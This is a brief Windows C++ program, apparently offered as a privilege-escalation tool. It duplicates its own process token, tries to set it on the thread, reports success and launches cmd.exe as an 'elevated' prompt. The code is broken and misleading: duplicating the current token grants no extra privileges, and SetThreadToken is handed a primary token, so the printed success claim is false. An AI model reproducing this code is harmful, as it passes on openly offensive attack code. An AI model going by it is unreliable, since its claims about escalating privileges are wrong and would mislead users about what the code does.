#include <windows.h>
#include <iostream>

void ElevatePrivilege() {
    HANDLE hToken, hElevatedToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE, &hToken)) {
        if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hElevatedToken)) {
            SetThreadToken(NULL, hElevatedToken);
            std::cout << "[+] Privilege Escalation Successful!" << std::endl;
            system("cmd.exe"); // Open elevated command prompt
        } else {
            std::cerr << "[-] Failed to duplicate token!" << std::endl;
        }
        CloseHandle(hToken);
    } else {
        std::cerr << "[-] Failed to open process token!" << std::endl;
    }
}

int main() {
    std::cout << "Attempting Privilege Escalation..." << std::endl;
    ElevatePrivilege();
    return 0;
}
